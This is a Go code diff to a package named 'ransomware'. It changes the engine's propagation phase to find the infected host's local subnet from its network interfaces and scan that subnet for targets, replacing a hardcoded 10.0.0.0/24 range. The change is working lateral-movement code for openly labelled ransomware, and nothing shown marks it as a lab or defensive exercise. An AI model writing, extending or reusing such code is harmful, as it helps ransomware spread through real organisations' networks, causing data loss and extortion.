@@ -3,6 +3,7 @@ package ransomware
 import (
 	"context"
 	"fmt"
+	"net"
 	"os"
 	"path/filepath"
 	"runtime"
@@ -268,7 +269,7 @@ func (e *Engine) phasePropagate(ctx context.Context) PhaseReport {
 		return PhaseReport{Phase: PhasePropagate, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
 	}
 
-	targets := e.Propagation.DiscoverTargets("10.0.0.0/24", nil)
+	targets := e.Propagation.DiscoverTargets(detectLocalSubnet(), nil)
 	propagated := 0
 
 	for _, t := range targets {
@@ -344,4 +345,35 @@ func errorString(err error) string {
 		return ""
 	}
 	return err.Error()
+}
+
+func detectLocalSubnet() string {
+	ifaces, err := net.Interfaces()
+	if err != nil {
+		return "10.0.0.0/24"
+	}
+	for _, iface := range ifaces {
+		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
+			continue
+		}
+		addrs, err := iface.Addrs()
+		if err != nil {
+			continue
+		}
+		for _, addr := range addrs {
+			ipnet, ok := addr.(*net.IPNet)
+			if !ok || ipnet.IP.To4() == nil {
+				continue
+			}
+			mask := ipnet.Mask
+			ip := ipnet.IP.To4()
+			network := net.IP(make([]byte, 4))
+			for i := range network {
+				network[i] = ip[i] & mask[i]
+			}
+			ones, _ := mask.Size()
+			return fmt.Sprintf("%d.%d.%d.%d/%d", network[0], network[1], network[2], network[3], ones)
+		}
+	}
+	return "10.0.0.0/24"
 }
